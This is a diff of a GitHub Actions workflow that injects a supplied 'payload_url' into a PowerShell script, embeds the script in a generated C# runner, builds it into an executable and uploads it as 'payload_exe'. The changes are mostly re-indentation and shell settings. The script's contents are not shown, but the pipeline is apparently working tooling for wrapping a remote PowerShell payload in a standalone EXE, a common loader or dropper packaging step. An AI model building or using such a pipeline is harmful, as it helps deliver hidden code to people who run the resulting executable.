@@ -13,91 +13,98 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
+      - name: Checkout code
+        uses: actions/checkout@v3
 
-    - name: Install .NET SDK
-      run: dotnet --version
+      - name: Install .NET SDK
+        run: dotnet --version
 
-    - name: Inject URL into static_code.ps1
-      run: |
-        echo "[INFO] Injecting payload URL into static_code.ps1"
-        $url = '${{ github.event.inputs.payload_url }}'
-        (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
-        echo "[SUCCESS] URL injected successfully!"
+      - name: Inject URL into static_code.ps1
+        shell: powershell
+        run: |
+          echo "[INFO] Injecting payload URL into static_code.ps1"
+          $url = "${{ github.event.inputs.payload_url }}"
+          (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
+          echo "[SUCCESS] URL injected successfully!"
 
-    - name: Debug: Print static_code.ps1 after injection
-      run: cat static_code.ps1
+      - name: Debug: Print static_code.ps1 after injection
+        shell: powershell
+        run: Get-Content static_code.ps1
 
-    - name: Create .NET console project
-      run: |
-        echo "[INFO] Creating .NET console project..."
-        dotnet new console -o PowerShellRunner
-        cd PowerShellRunner
-        dotnet add package Microsoft.PowerShell.SDK
-        echo "[SUCCESS] .NET project created."
+      - name: Create .NET console project
+        shell: powershell
+        run: |
+          echo "[INFO] Creating .NET console project..."
+          dotnet new console -o PowerShellRunner
+          cd PowerShellRunner
+          dotnet add package Microsoft.PowerShell.SDK
+          echo "[SUCCESS] .NET project created."
 
-    - name: Generate C# code with Embedded PowerShell Script
-      shell: powershell
-      run: |
-        echo "[INFO] Reading and escaping PowerShell script..."
-        $ps_script = Get-Content -Path 'static_code.ps1' -Raw
-        $escaped_script = $ps_script -replace "`"", "`"`"" -replace "`r?`n", "`n"
-        
-        echo "[INFO] Generating C# code..."
-        $csharp_code = @"
-        using System;
-        using System.Management.Automation;
+      - name: Generate C# code with Embedded PowerShell Script
+        shell: powershell
+        run: |
+          echo "[INFO] Reading and escaping PowerShell script..."
+          $ps_script = Get-Content -Path 'static_code.ps1' -Raw
+          $escaped_script = $ps_script -replace "`"", "`"`"" -replace "`r?`n", "`n"
+          
+          echo "[INFO] Generating C# code..."
+          $csharp_code = @"
+          using System;
+          using System.Management.Automation;
 
-        class Program {
-            static void Main() {
-                Console.WriteLine("[INFO] PowerShell execution started from C#.");
+          class Program {
+              static void Main() {
+                  Console.WriteLine("[INFO] PowerShell execution started from C#.");
 
-                string script = @`"$escaped_script`";
-                
-                using (PowerShell ps = PowerShell.Create()) {
-                    ps.AddScript(script);
-                    var results = ps.Invoke();
+                  string script = @`"$escaped_script`";
+                  
+                  using (PowerShell ps = PowerShell.Create()) {
+                      ps.AddScript(script);
+                      var results = ps.Invoke();
 
-                    Console.WriteLine("[INFO] Execution Results:");
-                    foreach (var result in results) {
-                        Console.WriteLine(result);
-                    }
+                      Console.WriteLine("[INFO] Execution Results:");
+                      foreach (var result in results) {
+                          Console.WriteLine(result);
+                      }
 
-                    if (ps.HadErrors) {
-                        Console.WriteLine("[ERROR] PowerShell encountered an error.");
-                        foreach (var error in ps.Streams.Error) {
-                            Console.WriteLine(error.ToString());
-                        }
-                    }
-                }
+                      if (ps.HadErrors) {
+                          Console.WriteLine("[ERROR] PowerShell encountered an error.");
+                          foreach (var error in ps.Streams.Error) {
+                              Console.WriteLine(error.ToString());
+                          }
+                      }
+                  }
 
-                Console.WriteLine("[SUCCESS] PowerShell execution completed.");
-                Console.WriteLine("Press Enter to exit...");
-                Console.ReadLine();  // Keep the console window open
-            }
-        }
-        "@
+                  Console.WriteLine("[SUCCESS] PowerShell execution completed.");
+                  Console.WriteLine("Press Enter to exit...");
+                  Console.ReadLine();  // Keep the console window open
+              }
+          }
+          "@
 
-        echo "[INFO] Writing C# code to PowerShellRunner/Program.cs..."
-        Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
-        echo "[SUCCESS] C# code written successfully."
+          echo "[INFO] Writing C# code to PowerShellRunner/Program.cs..."
+          Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
+          echo "[SUCCESS] C# code written successfully."
 
-    - name: Debug: Print generated C# code
-      run: cat PowerShellRunner/Program.cs
+      - name: Debug: Print generated C# code
+        shell: powershell
+        run: Get-Content PowerShellRunner/Program.cs
 
-    - name: Build EXE
-      run: |
-        echo "[INFO] Building .NET executable..."
-        cd PowerShellRunner
-        dotnet build -c Release
-        echo "[SUCCESS] Build completed."
+      - name: Build EXE
+        shell: powershell
+        run: |
+          echo "[INFO] Building .NET executable..."
+          cd PowerShellRunner
+          dotnet build -c Release
+          echo "[SUCCESS] Build completed."
 
-    - name: Debug: Check Build Output
-      run: ls -R PowerShellRunner/bin/Release/
+      - name: Debug: Check Build Output
+        shell: powershell
+        run: Get-ChildItem -Recurse PowerShellRunner/bin/Release/
 
-    - name: Upload executable
-      uses: actions/upload-artifact@v4
-      with:
-        name: payload_exe
-        path: PowerShellRunner/bin/Release/net9.0/PowerShellRunner.exe
+      - name: Upload executable
+        uses: actions/upload-artifact@v4
+        with:
+          name: payload_exe
+          path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe
+
